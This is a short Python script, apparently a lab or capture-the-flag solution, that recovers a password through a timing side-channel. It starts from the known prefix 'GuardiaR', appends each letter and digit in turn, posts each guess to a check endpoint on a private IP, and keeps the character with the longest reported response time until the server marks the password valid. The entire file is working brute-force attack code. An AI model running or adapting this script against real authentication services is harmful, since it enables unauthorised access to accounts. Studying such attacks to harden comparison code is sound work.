import requests
import string


class OnEstDesBrutes:
    car = string.ascii_letters + string.digits

    def __init__(self):
        self.password = 'GuardiaR'
        self.url = "http://192.168.137.125:5000/check"

    def request(self, letter: str):
        json = {
            "password": self.password + letter
        }
        response = requests.post(url=self.url, json=json, verify=False)
        if response.status_code == 200:
            if response.json()['result']['Valid']:
                print(self.password + letter)
                return None
            return response.json()['result']['time']
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
            return 
        
    def brut_force_l(self) -> None:
        test = []
        for l in self.car:
            t = self.request(l)
            if not t:
                return
            test.append([t, l])
        self.password += max(test, key=lambda x: x[0])[1]
        return 1
    
    def brut_force_password(self):
        while self.brut_force_l():
            print(self.password)

a = OnEstDesBrutes()
a.brut_force_password()